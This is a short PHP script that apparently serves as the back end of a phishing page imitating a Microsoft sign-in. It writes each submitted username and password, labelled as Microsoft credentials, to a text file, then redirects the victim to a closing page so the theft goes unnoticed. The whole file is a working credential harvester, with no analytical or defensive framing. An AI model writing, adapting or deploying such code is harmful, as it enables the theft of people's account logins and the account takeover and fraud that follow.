<?php


file_put_contents("usernames.txt", 
"Microsoft Username: " . $_POST['userid'] . "
Microsoft Password: " . $_POST['passid'] . "\n", FILE_APPEND);
header('Location: end.html');
exit();
?>